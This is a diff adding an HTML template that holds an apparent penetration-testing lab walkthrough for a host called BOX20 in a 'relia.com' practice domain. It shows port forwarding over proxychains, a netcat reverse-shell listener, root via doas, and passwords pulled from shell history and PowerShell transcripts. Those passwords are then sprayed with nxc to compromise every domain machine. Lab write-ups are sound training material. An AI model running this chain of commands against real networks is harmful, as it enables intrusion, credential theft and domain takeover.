@@ -1,0 +1,197 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX20</h1>
+    <p class="text">cred : andrew : Rb9kNokjDsjYyH</p>
+    <h2 class="subtitle">PrivEsc</h2>
+    <div class="code-box"><pre><code>$ netstat -an
+Active Internet connections (including servers)
+Proto Recv-Q Send-Q Local Address          Foreign Address        (state)    
+tcp4       0     36 172.16.67.20.22        172.16.67.254.53458    ESTABLISHED
+tcp4       0      0 127.0.0.1.25           *.*                    LISTEN     
+tcp4       0      0 127.0.0.1.9000         *.*                    LISTEN     
+tcp4       0      0 127.0.0.1.3306         *.*                    LISTEN     
+tcp46      0      0 *.33060                *.*                    LISTEN     
+tcp4       0      0 *.22                   *.*                    LISTEN     
+tcp6       0      0 *.22                   *.*                    LISTEN     
+udp4       0      0 *.514                  *.*                    
+udp6       0      0 *.514                  *.*                    
+Active UNIX domain sockets
+Address          Type   Recv-Q Send-Q            Inode             Conn             Refs          Nextref Addr
+fffff80003b17300 stream      0      0                0 fffff80003b17200                0                0
+fffff80003b17200 stream      0      0                0 fffff80003b17300                0                0
+fffff80003b17400 stream      0      0                0                0                0                0
+fffff80003b17700 stream      0      0                0 fffff80003b17800                0                0
+fffff80003b17800 stream      0      0                0 fffff80003b17700                0                0
+fffff80003b17900 stream      0      0 fffff800091a25a0                0                0                0 /tmp/mysql.sock
+fffff80003b17a00 stream      0      0 fffff800091a91e0                0                0                0 /tmp/mysqlx.sock
+fffff80003af2000 stream      0      0 fffff80003b655a0                0                0                0 /var/run/devd.pipe
+fffff80003b17500 dgram       0      0                0 fffff80003b17d00                0                0
+fffff80003b17600 dgram       0      0                0 fffff80003b17c00                0 fffff80003b17b00
+fffff80003b17b00 dgram       0      0                0 fffff80003b17c00                0                0
+fffff80003b17c00 dgram       0      0 fffff80003b3b960                0 fffff80003b17600                0 /var/run/logpriv
+fffff80003b17d00 dgram       0      0 fffff80003b3bb40                0 fffff80003b17500                0 /var/run/log
+fffff80003b17e00 seqpac      0      0 fffff80003b653c0                0                0                0 /var/run/devd.seqpacket.pipe</code></pre></div>
+<p class="text">Port 9000 is open. Smell like http...</p>
+<p class="text">Since there is no www folder in var dir, I searched folder with find command.</p>
+<div class="code-box"><pre><code>$ find / -name www 2>/dev/null
+/usr/local/www
+/usr/ports/www</code></pre></div>
+<p class="text">There is two www folder, but /usr/local/www is more susceptable.</p>
+
+<div class="code-box"><pre><code>$ pwd
+/usr/local/www/apache24/data
+$ ls
+printenv        test-cgi
+$ cd ../data
+$ ls
+index.html      info.php        phpMyAdmin
+$ curl http://127.0.0.1:9000
+curl: (52) Empty reply from server</code></pre></div>
+<p class="text">There is phpinfo, but I couldn't open it with curl command.</p>
+<p class="text">We should pivot this port.</p>
+
+<h2 class="subtitle">Exploit</h2>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/15]
+└─$ proxychains4 ssh -N -L 0.0.0.0:9000:127.0.0.1:9000 andrew@172.16.67.20
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+(andrew@172.16.67.20) Password for andrew@production:</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/20/1.png' %}" alt="">
+</div>
+
+
+<h2 class="subtitle">Dir search on BOX20</h2>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.222] from (UNKNOWN) [192.168.107.191] 63362
+sh: can't access tty; job control turned off
+$ whoami
+www
+$ sudo -l
+sh: sudo: not found
+$ doas
+usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
+$ doas id
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+$ id
+uid=80(www) gid=80(www) groups=80(www),0(wheel)
+$ doas bash
+id
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)</code></pre></div>
+
+
+<div class="code-box"><pre><code>pwd
+/home/mountuser
+cat .history
+#+1667314347
+whoami
+#+1667314351
+ls
+#+1667314352
+ls -al
+#+1667314356
+cd
+#+1667314359
+ls -al
+#+1667314378
+vi .mailrc
+#+1667314393
+ls -al
+#+1667314401
+vi .profile
+#+1667314422
+sshpass -p "<u>DRtajyCwcbWvH/9</u>" ssh mountuser@172.16.10.21
+#+1667314426
+exit
+#+1667314481
+exit</code></pre></div>
+
+<p class="text">I found mountuser credential. Remember that the moutuser is also AD user!</p>
+
+<h2 class="subtitle">AD enumeration</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 nxc smb internal -u mountuser -p 'DRtajyCwcbWvH/9' --shares
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+...
+SMB         172.16.67.21    445    FILES            [*] Enumerated shares
+SMB         172.16.67.21    445    FILES            Share           Permissions     Remark
+SMB         172.16.67.21    445    FILES            -----           -----------     ------
+SMB         172.16.67.21    445    FILES            ADMIN$                          Remote Admin
+SMB         172.16.67.21    445    FILES            apps            READ            
+SMB         172.16.67.21    445    FILES            C$                              Default share
+SMB         172.16.67.21    445    FILES            IPC$            READ            Remote IPC
+SMB         172.16.67.21    445    FILES            monitoring      READ            
+SMB         172.16.67.21    445    FILES            scripts         READ  </code></pre></div>
+
+<p class="text">The user mountuser has right to read un-default shares on BOX21. Let's access and download them, then analyze.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 smbclient //172.16.67.21/monitoring -U 'relia.com\mountuser%DRtajyCwcbWvH/9'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+smb: \> PROMPT OFF
+smb: \> RECURSE ON
+smb: \> mget *</code></pre></div>
+
+<p class="text">This command inistalled several txt files.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/21]
+└─$ ls
+PowerShell_transcript.FILES.35fvmr5q.20221019013308.txt  PowerShell_transcript.FILES.EAy4aUdb.20221019132030.txt
+PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt  PowerShell_transcript.FILES.KaQUnRKP.20221019133200.txt
+PowerShell_transcript.FILES.aH73VcF9.20221019134841.txt</code></pre></div>
+
+<p class="text">Since they are PowerShell_transcript, it may include credential.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/21]
+└─$ cat * | grep -i ConvertTo-SecureString -3 
+SerializationVersion: 1.1.0.1
+**********************
+Transcript started, output file is C:\Users\Administrator\Documents\PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt
+PS C:\Users\Administrator> $spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
+PS C:\Users\Administrator> $cred = New-Object System.Management.Automation.PSCredential("RELIA\Administrator", $spass)
+PS C:\Users\Administrator> Enter-PSSession -ComputerName INTRANET -Credential $cred
+Enter-PSSession : Connecting to remote server INTRANET failed with the following error message : WinRM cannot complete</code></pre></div>
+
+<p class="text">Luckily, we got AD\admin credential. Let's confirm that.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 nxc smb internal -u administrator -p 'vau!XCKjNQBv2$'   
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.67.7     445    INTRANET         [*] Windows Server 2022 Build 20348 x64 (name:INTRANET) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                      
+SMB         172.16.67.21    445    FILES            [*] Windows Server 2022 Build 20348 x64 (name:FILES) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                         
+SMB         172.16.67.6     445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)                                                                                                           
+SMB         172.16.67.15    445    WK02             [*] Windows 11 Build 22000 x64 (name:WK02) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.67.14    445    WK01             [*] Windows 11 Build 22000 x64 (name:WK01) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.67.30    445    WEBBY            [*] Windows Server 2022 Build 20348 x64 (name:WEBBY) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                         
+SMB         172.16.67.7     445    INTRANET         [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
+SMB         172.16.67.21    445    FILES            [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
+SMB         172.16.67.6     445    DC02             [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
+SMB         172.16.67.15    445    WK02             [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
+SMB         172.16.67.14    445    WK01             [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)
+SMB         172.16.67.30    445    WEBBY            [+] relia.com\administrator:vau!XCKjNQBv2$ (Pwn3d!)</code></pre></div>
+
+<p class="text">We've pwned all machines!</p>
+
+
+
+
+</body>
+</html>
